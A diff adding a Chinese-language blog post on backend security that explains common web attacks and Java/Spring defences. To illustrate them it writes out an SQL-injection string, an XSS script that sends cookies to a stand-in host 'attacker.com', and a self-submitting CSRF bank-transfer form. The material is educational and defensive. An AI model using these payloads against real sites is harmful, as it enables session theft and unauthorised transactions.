@@ -1,0 +1,501 @@
+---
+title: "后端安全：常见攻击手段与防护策略"
+date: 2026-03-24
+updated: 2026-03-24
+categories:
+  - 后端进阶
+tags: []
+description: "后端安全：常见攻击手段与防护策略 一、安全基础 1.1 安全三要素 要素 说明 防护措施 机密性 数据不被未授权访问 加密、权限控制 完整性 数据不被篡改 签名、哈希 可用性 服务持续可用 限流、高可"
+juejin:
+  id: "7620324078792458281"
+  url: https://juejin.cn/post/7620324078792458281
+  views: 85
+  likes: 0
+---
+
+## 后端安全：常见攻击手段与防护策略
+
+> 安全漏洞可能导致数据泄露、服务瘫痪、财产损失。本文梳理后端最常见的攻击手段和防护方案，帮你建立安全防线。
+
+* * *
+
+### 一、安全基础
+
+#### 1.1 安全三要素
+
+| 要素 | 说明 | 防护措施 |
+| --- | --- | --- |
+| **机密性** | 数据不被未授权访问 | 加密、权限控制 |
+| **完整性** | 数据不被篡改 | 签名、哈希 |
+| **可用性** | 服务持续可用 | 限流、高可用 |
+
+#### 1.2 安全开发原则
+
+```markdown
+1. 最小权限原则
+   - 服务只拥有最小必要权限
+   
+2. 纵深防御
+   - 多层防护，一层失守还有其他层
+   
+3. 不信任任何输入
+   - 外部输入都要验证
+   
+4. 安全默认
+   - 默认启用安全策略
+```
+
+* * *
+
+### 二、常见攻击与防护
+
+#### 2.1 SQL 注入
+
+**攻击原理**：
+
+```sql
+// 危险代码
+String sql = "SELECT * FROM users WHERE name = '" + username + "'";
+// 输入：admin' OR '1'='1
+// 结果：SELECT * FROM users WHERE name = 'admin' OR '1'='1'
+```
+
+**防护措施**：
+
+```less
+// ✅ 使用 PreparedStatement
+PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM users WHERE name = ?"
+);
+stmt.setString(1, username);
+
+// ✅ 使用 ORM
+@Query("SELECT u FROM User u WHERE u.name = :name")
+User findByName(@Param("name") String name);
+
+// ✅ 参数化查询（MyBatis）
+<select id="findByName" resultType="User">
+    SELECT * FROM users WHERE name = #{name}
+</select>
+```
+
+#### 2.2 XSS（跨站脚本攻击）
+
+**攻击原理**：
+
+```xml
+<!-- 用户输入：-->
+<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
+
+<!-- 页面显示时执行脚本 -->
+<div>
+    <script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
+</div>
+```
+
+**防护措施**：
+
+```arduino
+// ✅ 输出转义
+String safeOutput = HtmlUtils.htmlEscape(userInput);
+
+// ✅ 前端框架自动转义（React/Vue）
+// {userInput} 会自动转义
+
+// ✅ 内容安全策略 CSP
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+#### 2.3 CSRF（跨站请求伪造）
+
+**攻击原理**：
+
+```xml
+<!-- 攻击者网站 -->
+<form action="https://bank.com/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+**防护措施**：
+
+```less
+// ✅ CSRF Token
+@PostMapping("/transfer")
+public Result transfer(@RequestParam String to, 
+                       @RequestParam BigDecimal amount,
+                       @RequestParam String csrfToken) {
+    // 验证 Token
+    if (!csrfToken.equals(session.getAttribute("csrfToken"))) {
+        throw new CSRFException();
+    }
+    // 业务逻辑
+}
+
+// ✅ Spring Security 自动防护
+@EnableWebSecurity
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) {
+        http.csrf(csrf -> csrf.csrfTokenRepository(
+            CookieCsrfTokenRepository.withHttpOnlyFalse()
+        ));
+        return http.build();
+    }
+}
+
+// ✅ SameSite Cookie
+Set-Cookie: sessionid=xxx; SameSite=Strict
+```
+
+#### 2.4 文件上传漏洞
+
+**攻击原理**：
+
+```markdown
+1. 上传可执行文件（jsp、php）
+2. 访问上传的文件执行恶意代码
+```
+
+**防护措施**：
+
+```typescript
+// ✅ 白名单校验
+private static final Set<String> ALLOWED_TYPES = Set.of(
+    "image/jpeg", "image/png", "image/gif"
+);
+
+public String upload(MultipartFile file) {
+    // 1. 校验文件类型
+    if (!ALLOWED_TYPES.contains(file.getContentType())) {
+        throw new IllegalArgumentException("不支持的文件类型");
+    }
+    
+    // 2. 校验文件头（魔数）
+    byte[] header = file.getBytes(0, 8);
+    if (!isValidImageHeader(header)) {
+        throw new IllegalArgumentException("文件类型不匹配");
+    }
+    
+    // 3. 重命名文件
+    String newName = UUID.randomUUID().toString() + ".jpg";
+    
+    // 4. 限制存储目录（防止目录遍历）
+    Path uploadDir = Paths.get("/data/uploads");
+    Path target = uploadDir.resolve(newName).normalize();
+    if (!target.startsWith(uploadDir)) {
+        throw new IllegalArgumentException("非法路径");
+    }
+    
+    // 5. 保存文件
+    file.transferTo(target);
+    
+    return newName;
+}
+```
+
+#### 2.5 敏感信息泄露
+
+**常见问题**：
+
+```typescript
+// ❌ 错误码暴露堆栈信息
+@ExceptionHandler(Exception.class)
+public Result handle(Exception e) {
+    return Result.fail(e.getMessage());  // 暴露内部信息
+}
+
+// ❌ 日志打印敏感信息
+log.info("用户登录: username={}, password={}", username, password);
+
+// ❌ 接口返回敏感字段
+@Data
+public class UserDTO {
+    private String username;
+    private String password;  // 返回给前端！
+    private String idCard;
+}
+```
+
+**防护措施**：
+
+```kotlin
+// ✅ 统一错误处理
+@ExceptionHandler(Exception.class)
+public Result handle(Exception e) {
+    log.error("系统错误", e);  // 日志记录完整信息
+    return Result.fail("系统繁忙，请稍后重试");  // 返回通用提示
+}
+
+// ✅ 日志脱敏
+log.info("用户登录: username={}", username);
+
+// ✅ DTO 排除敏感字段
+@Data
+@JsonIgnoreProperties({"password", "idCard"})
+public class UserDTO {
+    private String username;
+    private String password;  // 不会被序列化
+}
+```
+
+#### 2.6 权限控制漏洞
+
+**攻击场景**：
+
+```arduino
+// 普通用户直接访问管理员接口
+POST /admin/users/delete?id=123
+```
+
+**防护措施**：
+
+```less
+// ✅ RBAC 权限模型
+@PreAuthorize("hasRole('ADMIN')")
+@DeleteMapping("/admin/users/{id}")
+public Result deleteUser(@PathVariable Long id) {
+    userService.delete(id);
+    return Result.success();
+}
+
+// ✅ 数据权限校验
+@GetMapping("/orders/{id}")
+public Result getOrder(@PathVariable Long id, 
+                       @AuthenticationPrincipal User user) {
+    Order order = orderService.getById(id);
+    // 校验只能看自己的订单
+    if (!order.getUserId().equals(user.getId())) {
+        throw new AccessDeniedException();
+    }
+    return Result.success(order);
+}
+```
+
+#### 2.7 密码安全
+
+**错误做法**：
+
+```scss
+// ❌ 明文存储
+user.setPassword(password);  // 直接存明文
+
+// ❌ 弱哈希
+user.setPassword(MD5.hash(password));  // MD5 已被破解
+```
+
+**正确做法**：
+
+```typescript
+// ✅ BCrypt 哈希（Spring Security）
+@Bean
+public PasswordEncoder passwordEncoder() {
+    return new BCryptPasswordEncoder();
+}
+
+// 存储
+String hashedPassword = passwordEncoder.encode(rawPassword);
+user.setPassword(hashedPassword);
+
+// 验证
+boolean matches = passwordEncoder.matches(
+    rawPassword, 
+    storedHash
+);
+
+// ✅ 加盐 + 多次哈希
+public String hashPassword(String password) {
+    String salt = BCrypt.gensalt(12);  // 工作因子 12
+    return BCrypt.hashpw(password, salt);
+}
+```
+
+#### 2.8 接口安全
+
+##### 签名验证
+
+```typescript
+// 请求签名机制
+public class ApiSigner {
+    
+    public String sign(Map<String, String> params, String secret) {
+        // 1. 参数排序
+        String sortedParams = params.entrySet().stream()
+            .sorted(Map.Entry.comparingByKey())
+            .map(e -> e.getKey() + "=" + e.getValue())
+            .collect(Collectors.joining("&"));
+        
+        // 2. 拼接密钥
+        String stringToSign = sortedParams + "&key=" + secret;
+        
+        // 3. HMAC-SHA256 签名
+        return HmacUtils.hmacSha256Hex(secret, stringToSign);
+    }
+    
+    public boolean verify(Map<String, String> params, 
+                          String sign, String secret) {
+        String expectedSign = sign(params, secret);
+        return expectedSign.equals(sign);
+    }
+}
+```
+
+##### 限流防刷
+
+```java
+// Guava RateLimiter
+@Service
+public class OrderService {
+    private final RateLimiter rateLimiter = RateLimiter.create(10);
+    
+    public Result createOrder(OrderRequest request) {
+        if (!rateLimiter.tryAcquire()) {
+            return Result.fail("请求过于频繁");
+        }
+        // 业务逻辑
+    }
+}
+
+// Redis 限流（滑动窗口）
+public boolean rateLimit(String key, int limit, int windowSeconds) {
+    long now = System.currentTimeMillis();
+    long windowStart = now - windowSeconds * 1000;
+    
+    // 清理过期数据
+    redisTemplate.opsForZSet().removeRangeByScore(
+        key, 0, windowStart
+    );
+    
+    // 统计窗口内请求数
+    Long count = redisTemplate.opsForZSet().zCard(key);
+    
+    if (count >= limit) {
+        return false;  // 限流
+    }
+    
+    // 记录本次请求
+    redisTemplate.opsForZSet().add(key, UUID.randomUUID().toString(), now);
+    redisTemplate.expire(key, windowSeconds, TimeUnit.SECONDS);
+    
+    return true;
+}
+```
+
+#### 2.9 会话管理
+
+**安全实践**：
+
+```typescript
+// ✅ 安全 Cookie 设置
+@Configuration
+public class SessionConfig {
+    
+    @Bean
+    public CookieSerializer cookieSerializer() {
+        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
+        serializer.setCookieName("SESSIONID");
+        serializer.setCookiePath("/");
+        serializer.setDomainNamePattern("^.+?\.(\w+\.\w+)$");
+        serializer.setUseSecureCookie(true);  // HTTPS only
+        serializer.setUseHttpOnlyCookie(true); // JS 无法访问
+        serializer.setSameSite("Strict");
+        return serializer;
+    }
+}
+
+// ✅ JWT 安全设置
+public String generateToken(User user) {
+    return Jwts.builder()
+        .setSubject(user.getId())
+        .setIssuedAt(new Date())
+        .setExpiration(new Date(System.currentTimeMillis() + 3600000))
+        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
+        .compact();
+}
+
+// 密钥定期轮换
+public void rotateKey() {
+    // 新旧密钥同时验证
+    // 新 Token 用新密钥
+    // 旧 Token 用旧密钥（宽限期）
+}
+```
+
+* * *
+
+### 三、安全防护清单
+
+#### 3.1 部署层
+
+```css
+- [ ] HTTPS 强制
+- [ ] HSTS 头
+- [ ] CSP 策略
+- [ ] WAF 防护
+- [ ] DDoS 防护
+```
+
+#### 3.2 应用层
+
+```css
+- [ ] 输入验证
+- [ ] 输出转义
+- [ ] SQL 参数化
+- [ ] 文件上传白名单
+- [ ] CSRF Token
+- [ ] 密码 BCrypt
+```
+
+#### 3.3 接口层
+
+```css
+- [ ] 接口鉴权
+- [ ] 签名验证
+- [ ] 限流防刷
+- [ ] 敏感数据脱敏
+- [ ] 错误信息隐藏
+```
+
+* * *
+
+### 四、安全工具
+
+| 工具 | 用途 |
+| --- | --- |
+| OWASP ZAP | 渗透测试 |
+| SonarQube | 代码扫描 |
+| Dependency-Check | 依赖漏洞扫描 |
+| Wireshark | 流量分析 |
+| Burp Suite | Web 安全测试 |
+
+* * *
+
+### 五、面试高频问题
+
+1.  **如何防止 SQL 注入？**
+    
+    1.  PreparedStatement、ORM、参数化查询
+2.  **XSS 和 CSRF 的区别？**
+    
+    1.  XSS：执行恶意脚本；CSRF：伪造用户请求
+3.  **密码如何安全存储？**
+    
+    1.  BCrypt + 盐，禁止明文和 MD5
+4.  **JWT 的安全问题？**
+    
+    1.  密钥泄露、无撤销机制、信息泄露
+
+* * *
+
+### 写在最后
+
+安全是系统工程，需要：
+
+1.  开发阶段：安全编码规范
+2.  测试阶段：安全测试
+3.  部署阶段：安全加固
+4.  运行阶段：安全监控
+
+记住：**安全没有银弹，多层防护才是王道**。
